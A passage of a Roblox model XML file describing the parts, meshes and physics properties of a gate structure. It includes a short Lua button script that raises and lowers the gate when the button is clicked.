							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>11.4996376</X>
								<Y>7.88781834</Y>
								<Z>-30.5083771</Z>
								<R00>9.11951065e-006</R00>
								<R01>-1.05774234e-007</R01>
								<R02>0.999999881</R02>
								<R10>-8.4498839e-005</R10>
								<R11>1</R11>
								<R12>1.06538209e-007</R12>
								<R20>-0.999999881</R20>
								<R21>-8.4498839e-005</R21>
								<R22>9.11951065e-006</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>-0.00159159454</X>
								<Y>-7.79966513e-007</Y>
								<Z>-1.43734142e-005</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>9.39433448e-005</X>
								<Y>-0.00765819522</Y>
								<Z>-0.00343341101</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX24">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX25">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>11.4996195</X>
								<Y>7.88798714</Y>
								<Z>-28.5083771</Z>
								<R00>9.11951065e-006</R00>
								<R01>-1.05774234e-007</R01>
								<R02>0.999999881</R02>
								<R10>-8.4498839e-005</R10>
								<R11>1</R11>
								<R12>1.06538209e-007</R12>
								<R20>-0.999999881</R20>
								<R21>-8.4498839e-005</R21>
								<R22>9.11951065e-006</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>-0.00159159454</X>
								<Y>-7.79966513e-007</Y>
								<Z>-1.43734142e-005</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>9.23858461e-005</X>
								<Y>-0.0044750059</Y>
								<Z>-0.00343368016</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX26">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX27">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>11.4996099</X>
								<Y>7.88807201</Y>
								<Z>-27.5083771</Z>
								<R00>9.11951065e-006</R00>
								<R01>-1.05774234e-007</R01>
								<R02>0.999999881</R02>
								<R10>-8.4498839e-005</R10>
								<R11>1</R11>
								<R12>1.06538209e-007</R12>
								<R20>-0.999999881</R20>
								<R21>-8.4498839e-005</R21>
								<R22>9.11951065e-006</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>-0.00159159454</X>
								<Y>-7.79966513e-007</Y>
								<Z>-1.43734142e-005</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>9.16070931e-005</X>
								<Y>-0.00288341101</Y>
								<Z>-0.0034338152</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX28">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX29">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>11.4995918</X>
								<Y>7.88824081</Y>
								<Z>-25.5083771</Z>
								<R00>9.11951065e-006</R00>
								<R01>-1.05774234e-007</R01>
								<R02>0.999999881</R02>
								<R10>-8.4498839e-005</R10>
								<R11>1</R11>
								<R12>1.06538209e-007</R12>
								<R20>-0.999999881</R20>
								<R21>-8.4498839e-005</R21>
								<R22>9.11951065e-006</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>-0.00159159454</X>
								<Y>-7.79966513e-007</Y>
								<Z>-1.43734142e-005</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>9.0049587e-005</X>
								<Y>0.000299778301</Y>
								<Z>-0.00343408342</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX30">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX31">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>11.4996014</X>
								<Y>7.88815594</Y>
								<Z>-26.5083771</Z>
								<R00>9.11951065e-006</R00>
								<R01>-1.05774234e-007</R01>
								<R02>0.999999881</R02>
								<R10>-8.4498839e-005</R10>
								<R11>1</R11>
								<R12>1.06538209e-007</R12>
								<R20>-0.999999881</R20>
								<R21>-8.4498839e-005</R21>
								<R22>9.11951065e-006</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>-0.00159159454</X>
								<Y>-7.79966513e-007</Y>
								<Z>-1.43734142e-005</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>9.08283328e-005</X>
								<Y>-0.00129181659</Y>
								<Z>-0.00343394838</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX32">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
				</Item>
				<Item class="Part" referent="RBX33">
					<Properties>
						<bool name="Anchored">false</bool>
						<float name="BackParamA">-0.5</float>
						<float name="BackParamB">0.5</float>
						<token name="BackSurface">0</token>
						<token name="BackSurfaceInput">0</token>
						<float name="BottomParamA">-0.5</float>
						<float name="BottomParamB">0.5</float>
						<token name="BottomSurface">2</token>
						<token name="BottomSurfaceInput">0</token>
						<int name="BrickColor">194</int>
						<CoordinateFrame name="CFrame">
							<X>11.4996834</X>
							<Y>7.88739586</Y>
							<Z>-35.5083771</Z>
							<R00>-0.999999881</R00>
							<R01>1.05774234e-007</R01>
							<R02>-9.11951065e-006</R02>
							<R10>-1.06538209e-007</R10>
							<R11>-1</R11>
							<R12>8.4498839e-005</R12>
							<R20>-9.11951065e-006</R20>
							<R21>8.4498839e-005</R21>
							<R22>0.999999881</R22>
						</CoordinateFrame>
						<bool name="CanCollide">true</bool>
						<bool name="DraggingV1">false</bool>
						<float name="Elasticity">0.5</float>
						<token name="FormFactor">1</token>
						<float name="Friction">0.300000012</float>
						<float name="FrontParamA">-0.5</float>
						<float name="FrontParamB">0.5</float>
						<token name="FrontSurface">0</token>
						<token name="FrontSurfaceInput">0</token>
						<float name="LeftParamA">-0.5</float>
						<float name="LeftParamB">0.5</float>
						<token name="LeftSurface">0</token>
						<token name="LeftSurfaceInput">0</token>
						<bool name="Locked">false</bool>
						<token name="Material">256</token>
						<string name="Name">Gate</string>
						<float name="Reflectance">0</float>
						<float name="RightParamA">-0.5</float>
						<float name="RightParamB">0.5</float>
						<token name="RightSurface">0</token>
						<token name="RightSurfaceInput">0</token>
						<Vector3 name="RotVelocity">
							<X>-0.00159159454</X>
							<Y>-7.79966513e-007</Y>
							<Z>-1.43734142e-005</Z>
						</Vector3>
						<float name="TopParamA">-0.5</float>
						<float name="TopParamB">0.5</float>
						<token name="TopSurface">2</token>
						<token name="TopSurfaceInput">0</token>
						<float name="Transparency">0</float>
						<Vector3 name="Velocity">
							<X>9.78371099e-005</X>
							<Y>-0.0156161692</Y>
							<Z>-0.00343273859</Z>
						</Vector3>
						<bool name="archivable">true</bool>
						<token name="shape">1</token>
						<Vector3 name="size">
							<X>1</X>
							<Y>10.8000002</Y>
							<Z>1</Z>
						</Vector3>
					</Properties>
					<Item class="BodyPosition" referent="RBX34">
						<Properties>
							<float name="D">1250</float>
							<string name="Name">BodyPosition</string>
							<float name="P">1000000</float>
							<bool name="archivable">true</bool>
							<Vector3 name="maxForce">
								<X>0</X>
								<Y>0</Y>
								<Z>10000</Z>
							</Vector3>
							<Vector3 name="position">
								<X>6.49973822</X>
								<Y>6.98733425</Y>
								<Z>16.4915771</Z>
							</Vector3>
						</Properties>
					</Item>
					<Item class="SpecialMesh" referent="RBX35">
						<Properties>
							<token name="LODX">2</token>
							<token name="LODY">2</token>
							<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
							<token name="MeshType">6</token>
							<string name="Name">Mesh</string>
							<Vector3 name="Offset">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<Vector3 name="Scale">
								<X>0.5</X>
								<Y>1</Y>
								<Z>0.5</Z>
							</Vector3>
							<Content name="TextureId"><null></null></Content>
							<Vector3 name="VertexColor">
								<X>1</X>
								<Y>1</Y>
								<Z>1</Z>
							</Vector3>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
				<Item class="Part" referent="RBX36">
					<Properties>
						<bool name="Anchored">true</bool>
						<float name="BackParamA">-0.5</float>
						<float name="BackParamB">0.5</float>
						<token name="BackSurface">0</token>
						<token name="BackSurfaceInput">0</token>
						<float name="BottomParamA">-0.5</float>
						<float name="BottomParamB">0.5</float>
						<token name="BottomSurface">2</token>
						<token name="BottomSurfaceInput">0</token>
						<int name="BrickColor">48</int>
						<CoordinateFrame name="CFrame">
							<X>9.60000038</X>
							<Y>7.30000019</Y>
							<Z>-36.5</Z>
							<R00>-0</R00>
							<R01>-1</R01>
							<R02>0</R02>
							<R10>-0</R10>
							<R11>-0</R11>
							<R12>1</R12>
							<R20>-1</R20>
							<R21>-0</R21>
							<R22>0</R22>
						</CoordinateFrame>
						<bool name="CanCollide">true</bool>
						<bool name="DraggingV1">false</bool>
						<float name="Elasticity">0.5</float>
						<token name="FormFactor">2</token>
						<float name="Friction">0</float>
						<float name="FrontParamA">-0.5</float>
						<float name="FrontParamB">0.5</float>
						<token name="FrontSurface">0</token>
						<token name="FrontSurfaceInput">0</token>
						<float name="LeftParamA">-0.5</float>
						<float name="LeftParamB">0.5</float>
						<token name="LeftSurface">0</token>
						<token name="LeftSurfaceInput">0</token>
						<bool name="Locked">false</bool>
						<token name="Material">256</token>
						<string name="Name">Button</string>
						<float name="Reflectance">0</float>
						<float name="RightParamA">-0.5</float>
						<float name="RightParamB">0.5</float>
						<token name="RightSurface">0</token>
						<token name="RightSurfaceInput">0</token>
						<Vector3 name="RotVelocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<float name="TopParamA">-0.5</float>
						<float name="TopParamB">0.5</float>
						<token name="TopSurface">0</token>
						<token name="TopSurfaceInput">0</token>
						<float name="Transparency">0</float>
						<Vector3 name="Velocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<bool name="archivable">true</bool>
						<token name="shape">1</token>
						<Vector3 name="size">
							<X>1</X>
							<Y>0.800000012</Y>
							<Z>1</Z>
						</Vector3>
					</Properties>
					<Item class="ClickDetector" referent="RBX37">
						<Properties>
							<float name="MaxActivationDistance">32</float>
							<string name="Name">ClickDetector</string>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
					<Item class="Script" referent="RBX38">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">ButtonScript</string>
							<ProtectedString name="Source">local isOn = true
down_pos = script.Parent.Parent.Gate.Position
up_pos = script.Parent.Parent.Up.Position





function on()
	isOn = true
	
	script.Parent.Parent.Gate.BodyPosition.position = up_pos
	script.Parent.BrickColor = BrickColor.new(21)

end

function off()
	isOn = false
	script.Parent.Parent.Gate.BodyPosition.position = down_pos
	script.Parent.BrickColor = BrickColor.new(48)


end

function onClicked()
	
	if isOn == true then off() else on() end

end

script.Parent.ClickDetector.MouseClick:connect(onClicked)

off()</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
				<Item class="Part" referent="RBX39">
					<Properties>
						<bool name="Anchored">false</bool>
						<float name="BackParamA">-0.5</float>
						<float name="BackParamB">0.5</float>
						<token name="BackSurface">0</token>
						<token name="BackSurfaceInput">0</token>
						<float name="BottomParamA">-0.5</float>
						<float name="BottomParamB">0.5</float>
						<token name="BottomSurface">0</token>
						<token name="BottomSurfaceInput">0</token>
						<int name="BrickColor">194</int>
						<CoordinateFrame name="CFrame">
							<X>11.4996328</X>
							<Y>13.8878613</Y>
							<Z>-30.0088844</Z>
							<R00>9.11951065e-006</R00>
							<R01>-1.05774234e-007</R01>
							<R02>0.999999881</R02>
							<R10>-8.4498839e-005</R10>
							<R11>1</R11>
							<R12>1.06538209e-007</R12>
							<R20>-0.999999881</R20>
							<R21>-8.4498839e-005</R21>
							<R22>9.11951065e-006</R22>
						</CoordinateFrame>
						<bool name="CanCollide">true</bool>
						<bool name="DraggingV1">false</bool>
						<float name="Elasticity">0.5</float>
						<token name="FormFactor">1</token>
						<float name="Friction">0.300000012</float>
						<float name="FrontParamA">-0.5</float>
						<float name="FrontParamB">0.5</float>
						<token name="FrontSurface">0</token>
						<token name="FrontSurfaceInput">0</token>
						<float name="LeftParamA">-0.5</float>
						<float name="LeftParamB">0.5</float>
						<token name="LeftSurface">0</token>
						<token name="LeftSurfaceInput">0</token>
						<bool name="Locked">false</bool>
						<token name="Material">256</token>
						<string name="Name">holder</string>
						<float name="Reflectance">0</float>
						<float name="RightParamA">-0.5</float>
						<float name="RightParamB">0.5</float>
						<token name="RightSurface">0</token>
						<token name="RightSurfaceInput">0</token>
						<Vector3 name="RotVelocity">
							<X>-0.00159159454</X>
							<Y>-7.79966513e-007</Y>
							<Z>-1.43734142e-005</Z>
						</Vector3>
						<float name="TopParamA">-0.5</float>
						<float name="TopParamB">0.5</float>
						<token name="TopSurface">0</token>
						<token name="TopSurfaceInput">0</token>
						<float name="Transparency">0</float>
						<Vector3 name="Velocity">
							<X>0.000179794864</X>
							<Y>-0.00686320569</Y>
							<Z>-0.0129830465</Z>
						</Vector3>
						<bool name="archivable">true</bool>
						<token name="shape">1</token>
						<Vector3 name="size">
							<X>12</X>
							<Y>1.20000005</Y>
							<Z>1</Z>
						</Vector3>
					</Properties>
				</Item>
				<Item class="Part" referent="RBX40">
					<Properties>
						<bool name="Anchored">false</bool>
						<float name="BackParamA">-0.5</float>
						<float name="BackParamB">0.5</float>
						<token name="BackSurface">0</token>
						<token name="BackSurfaceInput">0</token>
						<float name="BottomParamA">-0.5</float>
						<float name="BottomParamB">0.5</float>
						<token name="BottomSurface">0</token>
						<token name="BottomSurfaceInput">0</token>
						<int name="BrickColor">194</int>
						<CoordinateFrame name="CFrame">
							<X>11.4996338</X>
							<Y>1.88786054</Y>
							<Z>-30.0078697</Z>
							<R00>9.11951065e-006</R00>
							<R01>-1.05774234e-007</R01>
							<R02>0.999999881</R02>
							<R10>-8.4498839e-005</R10>
							<R11>1</R11>
							<R12>1.06538209e-007</R12>
							<R20>-0.999999881</R20>
							<R21>-8.4498839e-005</R21>
							<R22>9.11951065e-006</R22>
						</CoordinateFrame>
						<bool name="CanCollide">true</bool>
						<bool name="DraggingV1">false</bool>
						<float name="Elasticity">0.5</float>
						<token name="FormFactor">1</token>
						<float name="Friction">0.300000012</float>
						<float name="FrontParamA">-0.5</float>
						<float name="FrontParamB">0.5</float>
						<token name="FrontSurface">0</token>
						<token name="FrontSurfaceInput">0</token>
						<float name="LeftParamA">-0.5</float>
						<float name="LeftParamB">0.5</float>
						<token name="LeftSurface">0</token>
						<token name="LeftSurfaceInput">0</token>
						<bool name="Locked">false</bool>
						<token name="Material">256</token>
						<string name="Name">holder</string>
						<float name="Reflectance">0</float>
						<float name="RightParamA">-0.5</float>
						<float name="RightParamB">0.5</float>
						<token name="RightSurface">0</token>
						<token name="RightSurfaceInput">0</token>
						<Vector3 name="RotVelocity">
							<X>-0.00159159454</X>
							<Y>-7.79966513e-007</Y>
							<Z>-1.43734142e-005</Z>
						</Vector3>
						<float name="TopParamA">-0.5</float>
						<float name="TopParamB">0.5</float>
						<token name="TopSurface">0</token>
						<token name="TopSurfaceInput">0</token>
						<float name="Transparency">0</float>
						<Vector3 name="Velocity">
							<X>7.31308683e-006</X>
							<Y>-0.00686159031</Y>
							<Z>0.00611608941</Z>
						</Vector3>
						<bool name="archivable">true</bool>
						<token name="shape">1</token>
						<Vector3 name="size">
							<X>12</X>
							<Y>1.20000005</Y>
							<Z>1</Z>
						</Vector3>
					</Properties>
				</Item>
			</Item>
			<Item class="Model" referent="RBX41">
				<Properties>
					<CoordinateFrame name="ModelInPrimary">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">Frame</string>
					<Ref name="PrimaryPart">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Part" referent="RBX42">
					<Properties>
						<bool name="Anchored">true</bool>
						<float name="BackParamA">-0.5</float>
						<float name="BackParamB">0.5</float>
						<token name="BackSurface">0</token>
						<token name="BackSurfaceInput">0</token>
						<float name="BottomParamA">-0.5</float>
						<float name="BottomParamB">0.5</float>
						<token name="BottomSurface">4</token>
						<token name="BottomSurfaceInput">0</token>
						<int name="BrickColor">5</int>
						<CoordinateFrame name="CFrame">
							<X>10.5</X>
							<Y>15.1999998</Y>
							<Z>-24.5</Z>
							<R00>0</R00>
							<R01>0</R01>
							<R02>-1</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>-0</R12>
							<R20>1</R20>
							<R21>0</R21>
							<R22>-0</R22>
						</CoordinateFrame>
						<bool name="CanCollide">true</bool>
						<bool name="DraggingV1">false</bool>
						<float name="Elasticity">0.5</float>
						<token name="FormFactor">1</token>
						<float name="Friction">0.300000012</float>
						<float name="FrontParamA">-0.5</float>
						<float name="FrontParamB">0.5</float>
						<token name="FrontSurface">0</token>
						<token name="FrontSurfaceInput">0</token>
						<float name="LeftParamA">-0.5</float>
						<float name="LeftParamB">0.5</float>
						<token name="LeftSurface">0</token>
						<token name="LeftSurfaceInput">0</token>
						<bool name="Locked">false</bool>
						<token name="Material">256</token>
						<string name="Name">Smooth Block Model</string>
						<float name="Reflectance">0</float>
						<float name="RightParamA">-0.5</float>
						<float name="RightParamB">0.5</float>
						<token name="RightSurface">0</token>
						<token name="RightSurfaceInput">0</token>
						<Vector3 name="RotVelocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<float name="TopParamA">-0.5</float>
						<float name="TopParamB">0.5</float>
						<token name="TopSurface">3</token>
						<token name="TopSurfaceInput">0</token>
						<float name="Transparency">0</float>
						<Vector3 name="Velocity">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
						</Vector3>
						<bool name="archivable">true</bool>
						<token name="shape">1</token>
						<Vector3 name="size">
							<X>23</X>
							<Y>3.60000014</Y>
							<Z>1</Z>
						</Vector3>
					</Properties>
				</Item>
				<Item class="Part" referent="RBX43">
					<Properties>
						<bool name="Anchored">true</bool>
						<float name="BackParamA">-0.5</float>
						<float name="BackParamB">0.5</float>
						<token name="BackSurface">0</token>
						<token name="BackSurfaceInput">0</token>
						<float name="BottomParamA">-0.5</float>
						<float name="BottomParamB">0.5</float>
						<token name="BottomSurface">4</token>
						<token name="BottomSurfaceInput">0</token>
						<int name="BrickColor">5</int>
						<CoordinateFrame name="CFrame">
							<X>12.5</X>
							<Y>15.1999998</Y>
							<Z>-24.5</Z>
							<R00>0</R00>
							<R01>0</R01>
							<R02>-1</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>-0</R12>
							<R20>1</R20>
							<R21>0</R21>
							<R22>-0</R22>
						</CoordinateFrame>
						<bool name="CanCollide">true</bool>
						<bool name="DraggingV1">false</bool>
						<float name="Elasticity">0.5</float>
						<token name="FormFactor">1</token>
						<float name="Friction">0.300000012</float>
						<float name="FrontParamA">-0.5</float>
						<float name="FrontParamB">0.5</float>
						<token name="FrontSurface">0</token>
						<token name="FrontSurfaceInput">0</token>
						<float name="LeftParamA">-0.5</float>
						<float name="LeftParamB">0.5</float>
						<token name="LeftSurface">0</token>
						<token name="LeftSurfaceInput">0</token>
						<bool name="Locked">false</bool>
						<token name="Material">256</token>
						<string name="Name">Smooth Block Model</string>
						<float name="Reflectance">0</float>
						<float name="RightParamA">-0.5</float>
						<float name="RightParamB">0.5</float>
						<token name="RightSurface">0</token>
						<token name="RightSurfaceInput">0</token>
						<Vector3 name="RotVelocity">
